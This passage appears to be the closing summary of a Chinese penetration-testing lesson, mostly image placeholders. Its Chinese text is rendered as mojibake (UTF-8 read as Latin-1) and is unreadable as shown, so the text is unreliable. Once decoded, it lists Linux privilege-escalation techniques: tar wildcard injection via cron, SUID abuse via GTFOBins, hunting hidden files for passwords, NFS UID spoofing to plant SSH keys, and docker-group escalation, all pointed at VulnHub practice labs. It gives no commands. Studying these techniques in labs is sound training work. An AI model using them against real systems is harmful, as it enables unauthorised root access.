![](img/9ebd2d50a51785f5f4565fe95a8048b8_291.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†å¤šç§Linuxæƒé™æå‡æŠ€æœ¯ï¼š

![](img/9ebd2d50a51785f5f4565fe95a8048b8_293.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_295.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_297.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_299.png)

1.  **å®šæ—¶ä»»åŠ¡ææƒ**ï¼šé€šè¿‡åˆ†æé…ç½®ä¸å½“çš„cronä»»åŠ¡ï¼Œåˆ©ç”¨`tar`å‘½ä»¤çš„**é€šé…ç¬¦æ³¨å…¥**æ¼æ´ï¼Œæ³¨å…¥æ¶æ„å‚æ•°ä»è€Œä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤ã€‚
2.  **SUIDææƒ**ï¼šå¯»æ‰¾ç³»ç»Ÿä¸­è®¾ç½®äº†SUIDä½çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨`GTFOBins`ç­‰èµ„æºä¸­çš„å·²çŸ¥æ–¹æ³•ï¼Œå°†è¿™äº›ç¨‹åºçš„è¿è¡Œæƒé™æå‡ä¸ºæ–‡ä»¶æ‰€æœ‰è€…ï¼ˆé€šå¸¸æ˜¯rootï¼‰æƒé™ã€‚
3.  **ä¿¡æ¯æ”¶é›†ææƒ**ï¼š
    *   é€šè¿‡æŸ¥æ‰¾**éšè—æ–‡ä»¶**å‘ç°æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ï¼‰ã€‚
    *   åˆ©ç”¨é…ç½®ä¸å½“çš„**NFSå…±äº«**ï¼Œé€šè¿‡ä¼ªé€ ç”¨æˆ·IDè·å¾—å†™æƒé™ï¼Œè¿›è€Œå†™å…¥SSHå…¬é’¥å®ç°ç™»å½•ï¼Œå¹¶å¯èƒ½å€ŸåŠ©`docker`ç»„ç­‰ç‰¹æ®Šæƒé™è¿›ä¸€æ­¥ææƒã€‚

![](img/9ebd2d50a51785f5f4565fe95a8048b8_301.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_303.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_305.png)

![](img/9ebd2d50a51785f5f4565fe95a8048b8_307.png)

è¿™äº›æ–¹æ³•çš„æ ¸å¿ƒåœ¨äº**ç»†è‡´çš„ä¿¡æ¯æ”¶é›†**å’Œ**å¯¹ç³»ç»Ÿé…ç½®çš„æ·±å…¥ç†è§£**ã€‚åœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œéœ€è¦çµæ´»ç»„åˆè¿ç”¨è¿™äº›æŠ€æœ¯ã€‚è¯¾ç¨‹ä¸­æåˆ°çš„VulnHubé¶åœºï¼ˆå¦‚`/home/peter`ï¼‰æ˜¯æä½³çš„ç»ƒä¹ ç¯å¢ƒï¼Œå»ºè®®è¯¾åå®è·µä»¥å·©å›ºæ‰€å­¦çŸ¥è¯†ã€‚